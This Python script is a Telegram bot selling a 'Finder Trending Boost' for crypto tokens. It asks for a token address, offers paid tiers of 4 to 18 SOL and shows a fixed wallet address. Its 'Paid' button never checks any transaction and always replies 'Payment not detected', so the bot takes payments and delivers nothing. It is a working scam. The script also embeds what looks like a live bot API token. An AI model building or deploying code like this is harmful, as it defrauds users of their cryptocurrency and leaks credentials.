from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler, CallbackContext

# Replace 'YOUR_API_TOKEN' with the token you received from BotFather
API_TOKEN = '7373563578:AAF6KWWPUyIZUi-C1TYOIGT-sfWgjIGN7DQ'

def start(update: Update, context: CallbackContext) -> None:
    message = (
        "<b>Finder Trending Boost  //</b>\n\n"
        "⚡️ Guaranteed Trending\n\n"
        "💎 Increase volume & visibility for your token\n\n"
        "➤ type /trending to get started"
    )
    update.message.reply_text(message, parse_mode='html')
    
def trending(update: Update, context: CallbackContext) -> None:
    global ASKING_FOR_TOKEN
    ASKING_FOR_TOKEN = True
    message = ("Reply to this message with the CA of the token you would like to purchase Finder Trending for")
    update.message.reply_text(message, parse_mode='html')

def handle_message(update: Update, context: CallbackContext) -> None:
    global ASKING_FOR_TOKEN
    if ASKING_FOR_TOKEN:
        # Process the token here if needed
        message = '<b>Finder Trending Boost </b>💎\n\nBoost your token visibility and amplify its volume\n\n<b>Enjoy a limited-time 25% off sale!</b>\n\n➤ Select the trending time below'
        
        # Send inline buttons after receiving the token
        keyboard = [
            [InlineKeyboardButton("3 Hours | 4 SOL", callback_data='send3sol'), InlineKeyboardButton("6 Hours | 6.5 SOL", callback_data='send55sol')],
            [InlineKeyboardButton("12 Hours | 12 SOL", callback_data='send9sol'), InlineKeyboardButton("24 Hours | 18 SOL", callback_data='send16sol')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text(message, reply_markup=reply_markup, parse_mode='html')
        
        ASKING_FOR_TOKEN = False
    else:
        update.message.reply_text("I didn't understand that command. Please use /start or /trending.")

def send4sol(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    text = 'Send <code>4</code> SOL to the wallet below \n\n<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>\n\nClick "Paid" once sent to scan for transaction. Once detected trending will begin shortly.'
    keyboard = [
        [InlineKeyboardButton("Paid", callback_data='paid')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=query.message.chat_id, text=text, reply_markup=reply_markup, parse_mode='html')

def send65sol(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    text = 'Send <code>6.5</code> SOL to the wallet below \n\n<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>\n\nClick "Paid" once sent to scan for transaction. Once detected trending will begin shortly.'
    keyboard = [
        [InlineKeyboardButton("Paid", callback_data='paid')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=query.message.chat_id, text=text, reply_markup=reply_markup, parse_mode='html')

def send12sol(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    text = 'Send <code>12</code> SOL to the wallet below \n\n<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>\n\nClick "Paid" once sent to scan for transaction. Once detected trending will begin shortly.'
    keyboard = [
        [InlineKeyboardButton("Paid", callback_data='paid')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=query.message.chat_id, text=text, reply_markup=reply_markup, parse_mode='html')

def send18sol(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    text = 'Send <code>18</code> SOL to the wallet below \n\n<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>\n\nClick "Paid" once sent to scan for transaction. Once detected trending will begin shortly.'
    keyboard = [
        [InlineKeyboardButton("Paid", callback_data='paid')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=query.message.chat_id, text=text, reply_markup=reply_markup, parse_mode='html')

def paid(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    context.bot.send_message(chat_id=query.message.chat_id, text='Payment not detected, if already sent try again in a minute', parse_mode='html')

def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    if query.data == 'send3sol':
        send4sol(update, context)
    elif query.data == 'send55sol':
        send65sol(update, context)
    elif query.data == 'send9sol':
        send12sol(update, context)
    elif query.data == 'send16sol':
        send18sol(update, context)
    elif query.data == 'paid':
        paid(update, context)

def main():
    updater = Updater(API_TOKEN)
    dispatcher = updater.dispatcher

    # Command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("trending", trending))

    # Message handler
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Callback query handler for inline buttons
    dispatcher.add_handler(CallbackQueryHandler(button))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()